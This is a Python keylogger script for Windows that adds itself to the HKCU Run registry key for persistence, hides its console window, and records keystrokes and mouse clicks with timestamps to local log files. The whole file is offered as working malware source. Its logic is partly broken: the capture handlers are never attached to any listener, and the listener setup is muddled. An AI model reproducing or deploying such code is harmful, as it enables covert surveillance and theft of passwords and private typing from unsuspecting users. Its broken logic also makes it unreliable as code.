import os
import time
import platform
import sys
from pynput import keyboard, mouse
from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ

# Global variables
t = ""
Log_file = "keylogger_logs.txt"
interval = 60  # Interval for saving logs (in seconds)
start_time = time.time()

def addStartup():
    """
    Adds the current script to the startup registry key to run automatically at login.
    """
    if platform.system() == "Windows":
        try:
            fp = os.path.dirname(os.path.realpath(__file__))
            file_name = sys.argv[0].split('\\')[-1]
            new_file_path = os.path.join(fp, file_name)

            keyVal = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
            SetValueEx(key2change, 'MyKeyloggerApp', 0, REG_SZ, new_file_path)
            CloseKey(key2change)

            print(f"Added {new_file_path} to startup successfully.")
        except Exception as e:
            print(f"Failed to add to startup: {e}")
    else:
        print("This script can only add itself to startup on Windows.")

def hide_console():
    """
    Hides the console window of the Python script on Windows.
    """
    if platform.system() != "Windows":
        print("Console hiding is only supported on Windows.")
        return

    try:
        import win32console
        import win32gui

        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)
    except Exception as e:
        print(f"Failed to hide the console window: {e}")

def save_logs(data):
    """
    Saves the logged data locally in a timestamped file.
    """
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"log_{timestamp}.txt"
        with open(file_name, 'a') as log_file:
            log_file.write(data)
        print(f"Logs saved to {file_name}")
    except Exception as e:
        print(f"Failed to save logs: {e}")

def on_keyboard_event(key):
    """
    Handles keyboard events and logs the keys pressed.
    """
    global t, start_time

    key_data = f"\n[{time.ctime().split(' ')[3]}] Key event detected: {key}"
    t += key_data

    if len(t) > 500:
        with open(Log_file, 'a') as f:
            f.write(t)
        t = ""

    if time.time() - start_time >= interval:
        save_logs(t)
        start_time = time.time()
        t = ""

def on_mouse_event(x, y, button, pressed):
    """
    Handles mouse events and logs button clicks.
    """
    global t, start_time

    action = "Pressed" if pressed else "Released"
    data = f"\n[{time.ctime().split(' ')[3]}] Mouse {action}: {button} at ({x}, {y})"
    t += data

    if len(t) > 500:
        with open(Log_file, 'a') as f:
            f.write(t)
        t = ""

    if time.time() - start_time >= interval:
        save_logs(t)
        start_time = time.time()
        t = ""

def on_press(key):
    try:
        print(f'Key pressed: {key.char}')
    except AttributeError:
        print(f'Special key pressed: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def on_move(x, y):
    print(f'Mouse moved to ({x}, {y})')

def on_click(x, y, button, pressed):
    if pressed:
        print(f'Button {button} pressed at ({x}, {y})')

# Main function to start listeners
def start_logging():
    """
    Starts logging keyboard and mouse events.
    """
    # Collect events until the user presses the 'esc' key
    with keyboard.Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
        keyboard_listener.start()

    with mouse.Listener(on_move=on_move, on_click=on_click) as mouse_listener:
        mouse_listener.start()

    # Wait for 10 seconds to allow listeners to run (can be modified)
    time.sleep(10)

if __name__ == "__main__":
    try:
        if platform.system() == "Windows":
            addStartup()
            hide_console()
        else:
            print("Platform not supported for startup addition or console hiding.")
        
        start_logging()

    except KeyboardInterrupt:
        print("Logging stopped by user.")
